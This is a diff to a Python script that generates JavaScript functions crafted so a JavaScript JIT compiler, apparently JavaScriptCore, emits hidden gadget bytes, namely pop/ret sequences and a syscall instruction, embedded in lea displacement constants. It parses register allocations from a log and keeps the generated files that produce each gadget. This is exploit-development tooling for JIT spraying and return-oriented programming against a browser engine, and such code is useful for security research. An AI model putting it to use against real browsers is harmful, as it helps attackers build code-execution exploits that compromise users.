@@ -5,7 +5,7 @@ import pathlib
 
 
 gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
-rs_set = ['rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx']
+rs_set = {'rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx'}
 exec_path = ''
 
 def get_registers(log:str):
@@ -24,7 +24,7 @@ def get_registers(log:str):
             print(dd[2], ' '.join(dd[3:]))
         for num in nums:
             if line.find(num) != -1 and line[line.find(num) - 1] == ',':
-                mm[num] = line[line.find('r') : line.find(num) - 1]
+                mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
                 break
     return mm
 
@@ -45,14 +45,14 @@ def excute_js(js:str, filename:str)->bool:
                     gadgets.remove(jsc)
                     os.system('cp '  + filename + '.js '  + jsc + '.js')
 
-def generate_js(count:int):
+def generate_template(count:int):
     header = '''
 var array = new Uint8Array();
 function syscall_jsc('''
 
-    for i in range(11):
+    for i in range(count - 1):
         header += 'var' + str(i) + ', '
-    header += 'var11){\n'
+    header += 'var' + str(count - 1) + '){\n'
     base = 110
     middle1 = ''
     for i in range(count):
@@ -60,12 +60,8 @@ function syscall_jsc('''
         middle1 += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
         base += 1
     
-    jscs = []
 
-    for i in range(count):
-        for j in range(i, count):
-            jsc = '\tvar s = t' + str(i) + ' * 2 + t' + str(j) + ' + 0xc3;\n    return  '
-            jscs.append(jsc)
+    jsc = '\tvar s = t' + str(0) + ' * 2 + t' + str(1) + ' + 0xc3;\n    return  '
 
     middle2 = ''
     for i in range(count - 1):
@@ -82,9 +78,42 @@ for(var i = 0; i < 0x10000; i++)
     tail += '0xc' + str(count - 1) + ');'
     tail += '\n}\n'
 
-    for i, jsc in enumerate(jscs):
-        excute_js(header + middle1 + jsc + middle2 + tail, str(i))
+    excute_js(header + middle1 + jsc + middle2 + tail, 'test')
 
+def generate_js(filename:str):
+    f = open(filename, 'r')
+    lines = f.readlines()
+    header = ''
+    i = 0
+    while i < len(lines):
+        if lines[i].find('var s') == -1:
+            header += lines[i]
+        else:
+            i += 1
+            break
+        i += 1
+    tail = ''
+    while i < len(lines):
+        tail += lines[i]
+        i += 1
+
+    jscs = []
+    base = 110
+    # 428d945ac3000000 ;leal rdx,[rdx+r11*2+0xc3]
+    jsc5ac3 = 'var s = t' + str(int(rs_map['rdx']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
+    excute_js(header + jsc5ac3 + tail, '5ac3')
+    # 8d8c5ec3000000 ;leal rcx,[rsi+rbx*2+0xc3]
+    jsc5ec3 = 'var s = t' + str(int(rs_map['rsi']) - base) + ' + t' + str(int(rs_map['rbx']) - base) + ' * 2 + 0xc3;\n'
+    excute_js(header + jsc5ec3 + tail, '5ec3')
+    # 428d8c5fc3000000 ;leal rcx,[rdi+r11*2+0xc3]
+    jsc5fc3 = 'var s = t' + str(int(rs_map['rdi']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
+    excute_js(header + jsc5fc3 + tail, '5fc3')
+    # 438d8c58c3000000 ;leal rcx,[r8+r11*2+0xc3]
+    jsc58c3 = 'var s = t' + str(int(rs_map['r8']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n' 
+    excute_js(header + jsc58c3 + tail, '58c3')
+    # 8d4c0f05   	;leal rcx,[rdi+rcx*1+0x5]
+    jsc0f05 = 'var s = t' + str(int(rs_map['rcx']) - base) + ' + t' + str(int(rs_map['rdi']) - base) + ' + 0x5;\n'
+    excute_js(header + jsc0f05 + tail, '0f05')
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
@@ -98,6 +127,13 @@ if __name__ == "__main__":
         exit()
 
 
-    # for i in range(32):
-    generate_js(12)
+    generate_template(12)
+    rs_map = get_registers('test.txt')
+    if not rs_set < set(rs_map.keys()):
+        print('needed ', rs_set)
+        print('has', set(rs_map.keys()))
+        print('resgister are not enough')
+        exit()
+    print(rs_map)
+    generate_js('test.js')
     print('done')
